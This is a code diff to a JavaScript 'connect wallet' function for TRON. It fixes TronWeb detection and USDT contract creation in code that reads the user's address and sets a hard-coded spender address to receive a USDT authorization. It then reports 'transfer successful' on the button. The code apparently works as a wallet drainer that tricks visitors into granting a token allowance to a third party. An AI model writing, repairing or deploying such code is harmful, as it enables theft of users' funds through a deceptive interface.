@@ -1,7 +1,17 @@
 async function connectWallet() {
     try {
-        // 检查是否安装了 TronLink
-        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+        // 动态加载 tronWeb 对象
+        if (typeof window.tronWeb === 'undefined') {
+            // 这里可以加载 tronWeb 的 script
+            // 比如：const script = document.createElement('script');
+            // script.src = 'https://cdn.jsdelivr.net/npm/@tronprotocol/tronweb@latest/dist/TronWeb.min.js';
+            // document.head.appendChild(script);
+            alert('请安装支持 TRC20 的钱包插件并登录');
+            return;
+        }
+
+        // 确保钱包已连接
+        if (window.tronWeb.defaultAddress.base58) {
             // 获取用户的 TRON 地址
             const userAddress = window.tronWeb.defaultAddress.base58;
 
@@ -21,7 +31,7 @@ async function connectWallet() {
             ];
 
             // 创建 USDT 合约实例
-            const usdtContract = await window.tronWeb.contract(usdtAbi, usdtAddress);
+            const usdtContract = await window.tronWeb.contract().at(usdtAddress);
 
             // 授权地址和数量
             const spenderAddress = "TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz";
@@ -36,7 +46,7 @@ async function connectWallet() {
             // 更新按钮文本
             document.getElementById('okButton').innerText = '转账成功';
         } else {
-            alert('请安装支持 TRC20 钱包插件并登录');
+            alert('请登录支持 TRC20 的钱包');
         }
     } catch (error) {
         console.error(error);
